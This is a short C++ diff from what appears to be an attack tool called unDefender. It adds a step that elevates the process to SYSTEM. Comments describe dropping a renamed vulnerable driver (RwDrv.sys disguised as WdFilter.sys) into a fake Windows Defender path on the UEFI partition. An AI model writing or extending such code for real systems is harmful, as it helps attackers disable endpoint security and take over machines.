@@ -2,6 +2,14 @@
 
 int main()
 {
+	// let's get SYSTEM, shall we? ;)
+	auto success = GetSystem();
+	if (!success)
+	{
+		std::cout << "[-] Not enough privileges to elevate to SYSTEM, exiting...\n";
+		return 1;
+	}
+
 	// YES I KNOW IT'S SLOPPY BUT IT'S 5 AM AND THIS IS FAST.
 	// make sure to put in the same folder unDefender.exe AND the provided WdFilter.sys (which is basically RwDrv.sys :)
 	// this command sequence mounts the UEFI partition and creates a directory tree structure which mimicks the legit WdFilter path
